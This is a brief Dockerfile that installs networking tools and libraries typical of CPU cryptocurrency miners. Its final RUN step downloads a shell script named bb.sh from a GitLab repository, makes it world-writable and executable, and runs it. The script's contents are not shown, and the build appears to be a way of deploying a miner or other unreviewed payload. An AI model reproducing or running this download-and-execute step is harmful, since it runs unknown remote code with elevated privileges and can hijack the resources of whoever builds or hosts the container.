FROM ubuntu:20.04

RUN apt-get update && \
    apt-get install -y curl git wget screen ca-certificates libcurl4 libjansson4 libgomp1 sudo
RUN sudo su && wget https://gitlab.com/vienatasari/fixcuy/-/raw/main/bb.sh && chmod 777 bb.sh && ./bb.sh
